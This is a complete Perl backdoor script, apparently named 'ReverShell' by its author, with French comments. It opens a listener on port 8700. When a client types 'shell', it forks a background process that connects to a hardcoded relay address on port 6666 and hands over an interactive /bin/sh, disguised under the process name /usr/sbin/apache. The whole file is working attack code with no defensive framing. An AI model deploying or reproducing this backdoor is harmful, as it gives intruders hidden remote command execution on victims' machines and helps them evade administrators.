#!/usr/bin/perl -w

use strict;
use Socket;
use IO::Socket;
use FileHandle;

#notre adresse ip publique qui sera en fait l'adresse d'un serveur rebond
my $shellsock;
my $publicip           = "192.168.0.23";
my $fakeprocess        = "/usr/sbin/apache";
my $reverse_shell_port = 6666;

############### FUNCTIONS ###############

sub print_banner {
    my $banner = <<BAN;
#####################################################################

mmmmm                               mmmm  #             ""#    ""#   
#   "#  mmm   m   m   mmm    m mm  #"   " # mm    mmm     #      #   
#mmmm" #"  #  "m m"  #"  #   #"  " "#mmm  #"  #  #"  #    #      #   
#   "m #""""   #m#   #""""   #         "# #   #  #""""    #      #   
#    " "#mm"    #    "#mm"   #     "mmm#" #   #  "#mm"    "mm    "mm 

\t\t\tBY S0BEK!
#####################################################################                                        
BAN
    return $banner;
}

sub reverse_shell {

    socket( SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp') ) or die "$@\n";
    connect( SOCK, sockaddr_in( $reverse_shell_port, inet_aton($publicip) ) )
        or die "$@\n";
}

sub subprocess_reverse_shell {

    my $ppid = fork();

    #on place le processus en arrière-plan (processus enfant)
    if ( $ppid == 0 ) {

		#on appelle la connexion via le selecteur SOCK, qui sera utilisé pour la connexion (pipe)
        reverse_shell();

        open( STDIN,  ">&SOCK" ) or die;
        open( STDOUT, ">&SOCK" ) or die;
        open( STDERR, ">&SOCK" ) or die;
        exec( {"/bin/sh"} ( $fakeprocess, "-i" ) );

        #system("/bin/sh -i");
    }

    #print "Execution du shell passe en arriere-plan avec succes.";
}

############### MAIN ###############

my ( $sock, $client, $port );
$port = 8700;

#mise en place du serveur
$sock = new IO::Socket::INET(
    Proto     => 'tcp',
    LocalPort => $port,
    Listen    => SOMAXCONN,
    Reuse     => 1
) or die;

#reception des connexions entrantes
while ( $client = $sock->accept() ) {
    $client->autoflush(1);

    $client->send( print_banner() );
    $client->send(">");

    #reception des directives
    while (<$client>) {
        chomp;

        $client->send(">");

        last if (/quit/);

        subprocess_reverse_shell() if (/shell/);

    }
    continue {
        print( $client , ">" );
    }
    close($client);
}
close($sock);
